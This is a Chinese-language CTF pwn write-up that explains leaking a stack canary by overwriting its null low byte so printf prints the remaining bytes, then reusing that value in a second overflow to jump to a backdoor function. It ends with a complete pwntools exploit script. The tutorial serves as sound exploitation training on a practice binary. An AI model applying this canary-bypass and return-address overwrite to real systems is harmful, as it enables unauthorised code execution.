## 覆盖截断字符获取Canary

先看例题

检查一下安全机制
![image.png](http://joker233.top/usr/uploads/2025/11/3322668770.png)

IDA中找到漏洞函数

![image.png](http://joker233.top/usr/uploads/2025/11/1600708723.png)

很贴心的给了一个backdoor

![image.png](http://joker233.top/usr/uploads/2025/11/4095271406.png)

这题的栈帧挺好分析的，画个图出来

![image.png](http://joker233.top/usr/uploads/2025/11/638425251.png)

函数中有**两次栈溢出**可利用，第一个 `read`可读112字节，正好**覆盖不到**返回地址

第二个 `read`可读256字节，可以覆盖返回地址

于是思路很清晰，利用第一个 `read`泄露[font color="#0000FF"]**Canary值**[/font]，再用第二个来覆盖返回地址

Canary的低字节被设置为 [font color="#FF1493"]**\x00**[/font]，在小端序存储下，低位字节存储在最前面

我们用 `printf`来泄露的话，遇到[font color="#FF1493"]**\x00**[/font]便会被截断，导致无法泄露后续的数据

因此1，如果可以覆盖掉这个[font color="#FF1493"]**\x00**[/font]，就可以绕过printf的截断从而泄露出canary。

```python
buf[0]......buf[95] | 00 xx xx xx |......
```

不过，因为我们修改了canary，因此泄露canary和利用漏洞的过程必须在同一个函数内进行，并且利用的过程需要将[font color="#FF1493"]**\x00**[/font]恢复

![image.png](http://joker233.top/usr/uploads/2025/11/1129992173.png)

可以看到，[font color="#FF1493"]**\x00**[/font]被替换成了[font color="#FF1493"]**\x0a**[/font]（使用了sendline），printf成功泄露出了后面三个值[font color="#1E90FF"]**55 91 2c**[/font]

那么Canary值就是

```python
Canary = 0x2c915500
```

最后**注意**，使用读取偏移的方法截取这三个字节的时候，要把前面I got your words的18个字节算上

[font color="#A9A9A9"]~~（我就是没注意这个导致Canary一直没泄露成功）~~[/font]

最后exp：

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'
p = remote('ip', port)
#p = process('./canary1')  

backdoor_addr = 0x08049223

p.recvuntil("say:\n")
payload1 = cyclic(96)
p.sendline(payload1)
response = p.recvuntil(b'Okay')
canary_bytes = b'\x00'+response[116:119]
canary = u32(canary_bytes)

print(hex(canary))

payload2 = b'A'*96 + p32(canary) + b'B'*8 + p32(0x42424242) + p32(backdoor_addr)
p.recvuntil(b'next?\n')

p.send(payload2)

p.interactive()

```